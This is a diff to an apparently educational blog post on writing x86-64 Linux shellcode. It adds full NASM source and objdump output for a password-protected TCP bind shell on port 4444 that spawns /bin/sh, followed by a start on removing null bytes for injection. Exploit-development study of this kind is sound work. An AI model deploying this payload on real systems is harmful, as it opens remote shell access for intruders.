@@ -19,7 +19,7 @@ I started by writing the bind shell itself, with no password. To do this it's ea
         struct sockaddr_in server;
         int sock, new;
         char *arguments[] = {"/bin/sh", 0};
-        
+
         sock = socket(AF_INET, SOCK_STREAM, 0);
 
         server.sin_family = AF_INET;
@@ -298,6 +298,252 @@ The result is that `repz` will stop repeating when the length to compare (in RCX
 
 Answer: you should pick the second option.
 
+Complete shellcode
+------------------
+
+At this point we have a complete shellcode for a password-protected TCP bind shell! Yay! Buf if you assemble this shellcode you will see it's full of null bytes (see below). We'll take care of that in the next section.
+
+Regarding the shellcode size right now we have 211 bytes. This can be substantially improved.
+
+    $ objdump -d test.o | grep -P ":\t" | cut -f2 | tr -d ' \n' | sed -e 's/\(..\)/\\x\1/g' | grep -o x | tr -d '\n' | wc -c
+    211
+
+Unoptimised shellcode:
+
+    global _start
+
+    _start:
+        jmp real_start
+        password: db "pass"
+        pass_len: db $-password
+
+    real_start:
+
+        ; sock = socket(AF_INET, SOCK_STREAM, 0)
+        ; AF_INET = 2
+        ; SOCK_STREAM = 1
+        ; __NR_socket = 41
+
+        mov rax, 41
+        mov rdi, 2
+        mov rsi, 1
+        mov rdx, 0
+        syscall
+
+        mov rdi, rax
+
+        ; server.sin_family = AF_INET;    short
+        ; server.sin_port = htons(4444);    unsigned short
+        ; server.sin_addr.s_addr = INADDR_ANY;    unsigned long
+        ; bzero(&server.sin_zero, 8);
+        ;
+        ; https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
+        ; struct sockaddr_in {
+        ;     short            sin_family;
+        ;     unsigned short   sin_port;
+        ;     struct in_addr   sin_addr;
+        ;     char             sin_zero[8];
+        ; };
+        ;
+        ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
+        ; __NR_bind = 49
+
+        xor rax, rax
+        push rax
+        mov dword [rsp-4], eax
+        sub rsp, 4
+        push word 0x5c11  ; htons(4444)
+        push word 2
+
+        ; bind
+        mov rax, 49
+        mov rsi, rsp
+        mov rdx, 16  ; sizeof(sockaddr_in)
+        syscall
+
+        ; listen(sock, 2)
+        ; __NR_listen = 50
+
+        mov rax, 50
+        mov rsi, 2
+        syscall
+
+        ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
+        ; __NR_accept = 43
+
+        mov rax, 43
+        xor rsi, rsi
+        xor rdx, rdx
+        syscall
+
+        mov rbx, rax
+
+        ; close(sock)
+        ; __NR_close = 3
+
+        mov rax, 3
+        syscall
+
+        ; dup2(new, 0);
+        ; dup2(new, 1);
+        ; dup2(new, 2);
+        ; __NR_dup2 = 33
+
+        mov rax, 33
+        mov rdi, rbx
+        xor rsi, rsi
+        syscall
+
+        mov rax, 33
+        inc rsi
+        syscall
+
+        mov rax, 33
+        inc rsi
+        syscall
+
+    check_password:
+        mov rax, 0
+        ; rdi = fd (bound socket)
+        sub rsp, 16   ; create space for "buf" in the stack
+        mov rsi, rsp  ; rsi = *buf
+        mov rdx, 16
+        syscall
+
+        ; compare password
+        xor rcx, rcx
+        mov cl, [rel pass_len]
+        lea rdi, [rel password]
+        cld
+        repz cmpsb
+        jne exit
+
+        ; int execve(const char *path, char *const argv[], char *const envp[])
+        ; rdi, path = (char*) /bin//sh, 0x00 (double slash for padding)
+        ; rsi, argv = (char**) (/bin//sh, 0x00)
+        ; rdx, envp = &0x00
+
+        xor rax, rax
+        push rax
+        mov rdx, rsp ; *rdx = &0x00
+
+        mov rsi, 0x68732f2f6e69622f
+        push rsi
+        mov rdi, rsp ; rdi = (char*) /bin//sh
+
+        push rax
+        push rdi
+        mov rsi, rsp ; rsi = (char**) (/bin//sh, 0x00)
+
+        mov al, 59
+        syscall
+
+    exit:
+        mov rax, 60
+        syscall
+
+Shellcode disassembly revealing nulls:
+
+    $ nasm -felf64 bind-shell-pass.nasm
+    $ objdump -M intel -d bind-shell-pass.o
+
+    bind-shell-pass.o:     file format elf64-x86-64
+
+    Disassembly of section .text:
+
+    0000000000000000 <_start>:
+       0:	eb 05                	jmp    7 <real_start>
+
+    0000000000000002 <password>:
+       2:	70 61                	jo     65 <real_start+0x5e>
+       4:	73 73                	jae    79 <real_start+0x72>
+
+    0000000000000006 <pass_len>:
+       6:	04                   	.byte 0x4
+
+    0000000000000007 <real_start>:
+       7:	b8 29 00 00 00       	mov    eax,0x29
+       c:	bf 02 00 00 00       	mov    edi,0x2
+      11:	be 01 00 00 00       	mov    esi,0x1
+      16:	ba 00 00 00 00       	mov    edx,0x0
+      1b:	0f 05                	syscall
+      1d:	48 89 c7             	mov    rdi,rax
+      20:	48 31 c0             	xor    rax,rax
+      23:	50                   	push   rax
+      24:	89 44 24 fc          	mov    DWORD PTR [rsp-0x4],eax
+      28:	48 83 ec 04          	sub    rsp,0x4
+      2c:	66 68 11 5c          	pushw  0x5c11
+      30:	66 6a 02             	pushw  0x2
+      33:	b8 31 00 00 00       	mov    eax,0x31
+      38:	48 89 e6             	mov    rsi,rsp
+      3b:	ba 10 00 00 00       	mov    edx,0x10
+      40:	0f 05                	syscall
+      42:	b8 32 00 00 00       	mov    eax,0x32
+      47:	be 02 00 00 00       	mov    esi,0x2
+      4c:	0f 05                	syscall
+      4e:	b8 2b 00 00 00       	mov    eax,0x2b
+      53:	48 31 f6             	xor    rsi,rsi
+      56:	48 31 d2             	xor    rdx,rdx
+      59:	0f 05                	syscall
+      5b:	48 89 c3             	mov    rbx,rax
+      5e:	b8 03 00 00 00       	mov    eax,0x3
+      63:	0f 05                	syscall
+      65:	b8 21 00 00 00       	mov    eax,0x21
+      6a:	48 89 df             	mov    rdi,rbx
+      6d:	48 31 f6             	xor    rsi,rsi
+      70:	0f 05                	syscall
+      72:	b8 21 00 00 00       	mov    eax,0x21
+      77:	48 ff c6             	inc    rsi
+      7a:	0f 05                	syscall
+      7c:	b8 21 00 00 00       	mov    eax,0x21
+      81:	48 ff c6             	inc    rsi
+      84:	0f 05                	syscall
+
+    0000000000000086 <check_password>:
+      86:	b8 00 00 00 00       	mov    eax,0x0
+      8b:	48 83 ec 10          	sub    rsp,0x10
+      8f:	48 89 e6             	mov    rsi,rsp
+      92:	ba 10 00 00 00       	mov    edx,0x10
+      97:	0f 05                	syscall
+      99:	48 31 c9             	xor    rcx,rcx
+      9c:	8a 0d 64 ff ff ff    	mov    cl,BYTE PTR [rip+0xffffffffffffff64]        # 6 <pass_len>
+      a2:	48 8d 3d 59 ff ff ff 	lea    rdi,[rip+0xffffffffffffff59]        # 2 <password>
+      a9:	fc                   	cld
+      aa:	f3 a6                	repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
+      ac:	75 1e                	jne    cc <exit>
+      ae:	48 31 c0             	xor    rax,rax
+      b1:	50                   	push   rax
+      b2:	48 89 e2             	mov    rdx,rsp
+      b5:	48 be 2f 62 69 6e 2f 	movabs rsi,0x68732f2f6e69622f
+      bc:	2f 73 68
+      bf:	56                   	push   rsi
+      c0:	48 89 e7             	mov    rdi,rsp
+      c3:	50                   	push   rax
+      c4:	57                   	push   rdi
+      c5:	48 89 e6             	mov    rsi,rsp
+      c8:	b0 3b                	mov    al,0x3b
+      ca:	0f 05                	syscall
+
+    00000000000000cc <exit>:
+      cc:	b8 3c 00 00 00       	mov    eax,0x3c
+      d1:	0f 05                	syscall
+
+Removing nulls
+--------------
+
+We're almost done. Now we want to remove nulls. From the `objdump` above you can see all null bytes are in `mov` instructions with immediate values. To remove these we can move/add to lower parts of the registers instead of moving 64-bit values (whose higher bytes are nulls). But you need to make sure the higher part of the register is zeroed before (typically by xoring the register with itself).
+
+Example:
+
+    mov rax, 41   ; b8 29 00 00 00          mov    eax,0x29
+
+    ; can be rewritten as
+
+    xor rax, rax  ; 48 31 c0                xor    rax,rax
+    mov al, 41    ; b0 29                   mov    al,0x29
+
+Optimising
+----------
 
 [man_2_syscall]: https://linux.die.net/man/2/syscall
 [man_2_bind]: https://linux.die.net/man/2/bind
